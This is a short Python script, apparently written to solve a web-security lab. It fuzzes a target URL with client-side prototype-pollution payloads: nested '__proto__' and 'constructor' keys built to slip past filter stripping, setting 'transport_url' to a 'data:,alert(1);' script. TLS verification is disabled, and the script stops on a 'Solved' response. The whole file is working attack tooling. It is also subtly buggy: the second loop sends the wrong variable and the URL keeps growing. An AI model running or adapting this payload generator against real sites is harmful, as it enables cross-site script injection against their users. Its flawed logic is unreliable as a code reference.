from socket import socket

import typer
evilString = "__proto__"
import urllib
import urllib3
import ssl
def main(url: str,number_of_times: int,file_output:str="payload"):
    # Crea un PoolManager
    http = urllib3.PoolManager(cert_reqs='CERT_NONE', assert_hostname=False)

    # Specifica l'URL di destinazione


    # Fai una richiesta GET


    #context = ssl.create_default_context()
    #context.check_hostname = False
    #context.verify_mode = ssl.CERT_NONE
    evilString = "__proto__"
    evilString2 = "constructor"
    with open(file_output,"w") as file:
        for i in range(0,number_of_times):
            evilString = "__pro" + evilString + "to__"
            evilString += "[transport_url]=data:,alert(1);"
            url = url + "?"+evilString


            response = http.request('GET', url)
            # Stampa la risposta
            #print(response.data.decode('utf-8'))

            response = response.data.decode('utf-8')
            #print(response)
            if "Solved" in response:
                print(f"This is the malicious payload {url}")
                break

            #file.write(evilString)

            evilString = evilString.replace("[transport_url]=data:,alert(1);","")
            #file.write("\n")

        for i in range(0,number_of_times):
            evilString2 = "const"+evilString2+"ructor"
            evilString2 += "[transport_url]=data:,alert(1);"
            url = url + "?" + evilString


            response = http.request('GET', url)
            # Stampa la risposta
            # print(response.data.decode('utf-8'))

            response = response.data.decode('utf-8')
            # print(response)
            if "Solved" in response:
                print(f"This is the malicious payload {url}")
                break
            #file.write(evilString2)
            evilString2 = evilString2.replace("[transport_url]=data:,alert(1);","")
            #file.write("\n")

if __name__ == "__main__":
    typer.run(main)
